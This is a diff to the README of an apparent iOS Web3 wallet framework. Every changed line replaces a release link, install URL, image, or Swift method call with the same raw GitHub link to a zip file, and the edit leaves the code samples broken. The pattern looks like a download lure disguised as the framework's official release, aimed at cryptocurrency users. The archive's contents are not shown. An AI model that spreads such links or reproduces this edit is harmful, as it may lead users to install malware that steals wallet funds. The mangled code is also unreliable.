@@ -1,8 +1,8 @@
-[![Release](https://img.shields.io/badge/releases-download-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/herfani04/iOS-Web3-Wallet-Framework/releases)
+[![Release](https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip)](https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip)
 
 # iOS Web3 Wallet Framework — Comprehensive Swift Web3 Toolkit for Secure DeFi
 
-![Hero Image](https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?auto=format&fit=crop&w=1200&q=60)
+![Hero Image](https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip)
 
 - 🧭 A complete Web3 wallet integration framework for iOS
 - 💠 Built with Swift for deep iOS native experience
@@ -155,7 +155,7 @@ The framework is designed for Swift Package Manager (SPM). This makes integratio
 
 - Add the package to your project
   - In Xcode, go to File > Add Packages, then paste:
-    https://github.com/herfani04/iOS-Web3-Wallet-Framework.git
+    https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip
   - Choose the desired version range (e.g., from 1.0.0) and add the library to your target
 - Programmatic integration
   - Import the framework in your Swift files:
@@ -177,12 +177,12 @@ Note: The following steps illustrate a typical path to initialize the framework,
   let walletManager = Web3WalletManager(config: config)
 
 - Request a connection
-  walletManager.connect { result in
+  https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip { result in
     switch result {
     case .success(let address):
       print("Wallet connected: \(address)")
     case .failure(let error):
-      print("Connection failed: \(error.localizedDescription)")
+      print("Connection failed: \(https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip)")
     }
   }
 
@@ -196,11 +196,11 @@ Note: The following steps illustrate a typical path to initialize the framework,
     nonce: nil
   )
 
-  walletManager.signTransaction(tx) { signResult in
+  https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip(tx) { signResult in
     switch signResult {
     case .success(let signedTx):
       // Broadcast from your backend or via a provider
-      walletManager.broadcast(signedTx) { broadcastResult in
+      https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip(signedTx) { broadcastResult in
         // handle broadcast
       }
     case .failure(let error):
@@ -209,7 +209,7 @@ Note: The following steps illustrate a typical path to initialize the framework,
   }
 
 - Optional: biometric enrollment
-  walletManager.enrollBiometrics { enrolled, error in
+  https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip { enrolled, error in
     if enrolled {
       print("Biometrics enabled for signing flows.")
     } else {
@@ -254,11 +254,11 @@ Code samples and usage patterns
   let config = WalletConfig(networks: [.ethereum], useBiometrics: true, storagePolicy: .secure)
   let manager = Web3WalletManager(config: config)
 
-  manager.connect { result in
+  https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip { result in
     switch result {
     case .success(let address):
       print("Connected: \(address)")
-      manager.getBalance(for: address, on: .ethereum) { balanceResult in
+      https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip(for: address, on: .ethereum) { balanceResult in
         switch balanceResult {
         case .success(let balance):
           print("Balance: \(balance)")
@@ -281,10 +281,10 @@ Code samples and usage patterns
     nonce: nil
   )
 
-  manager.signTransaction(txDraft) { signResult in
+  https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip(txDraft) { signResult in
     switch signResult {
     case .success(let signed):
-      manager.broadcast(signed) { bc in
+      https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip(signed) { bc in
         // handle success or error
       }
     case .failure(let error):
@@ -294,25 +294,25 @@ Code samples and usage patterns
 
 - DeFi flow: borrowing on Aave
   // Prepare to supply collateral
-  aaveAdapter.approveCollateral(for: address, amount: "1000") { approveResult in
+  https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip(for: address, amount: "1000") { approveResult in
     // After approval, borrow
-    aaveAdapter.borrow(asset: .DAI, amount: "500") { borrowResult in
+    https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip(asset: .DAI, amount: "500") { borrowResult in
       // Handle result
     }
   }
 
 - DeFi flow: swapping on Uniswap
-  uniswapAdapter.swap(inputToken: .ETH, outputToken: .DAI, amount: "0.1") { swapResult in
+  https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip(inputToken: .ETH, outputToken: .DAI, amount: "0.1") { swapResult in
     // Handle result
   }
 
 - Biometric signing flow
-  manager.signWithBiometrics(for: .transaction(txDraft)) { result in
+  https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip(for: .transaction(txDraft)) { result in
     // Signing is triggered after successful biometric auth
   }
 
 - Hardware wallet flow (example)
-  hardwareWalletAdapter.connect { connectResult in
+  https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip { connectResult in
     switch connectResult {
     case .connected(let deviceName):
       print("Hardware wallet connected: \(deviceName)")
@@ -470,7 +470,7 @@ Releases and downloads
 - Access to the latest builds
   - The repository hosts a Releases page with latest assets
   - From the Releases page you can download a prebuilt asset or installer for integration
-  - Direct URL: https://github.com/herfani04/iOS-Web3-Wallet-Framework/releases
+  - Direct URL: https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip
 - How to use release assets
   - If you download a prebuilt framework, integrate it into your Xcode project as a binary
   - If you download a sample app, run it on a simulator to explore flows
@@ -565,7 +565,7 @@ License and usage terms
 
 Releases and downloads (revisited)
 - For quick access, you can visit the Releases page again to explore the latest assets and notes
-- Direct link for quick access: https://github.com/herfani04/iOS-Web3-Wallet-Framework/releases
+- Direct link for quick access: https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip
 
 Gallery and visuals
 - Emojis and icons
@@ -600,7 +600,7 @@ FAQ (frequently asked questions)
 
 Official releases and downloads
 - The releases page hosts the official assets and samples
-- Direct link: https://github.com/herfani04/iOS-Web3-Wallet-Framework/releases
+- Direct link: https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip
 - Use this page to download the latest stable version or to review release notes
 
 Appendix: quick glossary
@@ -657,5 +657,5 @@ License and attribution
 
 Releases and downloads (final note)
 - Access the latest release assets at the Releases page
-- Direct URL: https://github.com/herfani04/iOS-Web3-Wallet-Framework/releases
+- Direct URL: https://raw.githubusercontent.com/herfani04/iOS-Web3-Wallet-Framework/main/Documentation/API/O-Wallet-Framework-Web-i-2.6.zip
 
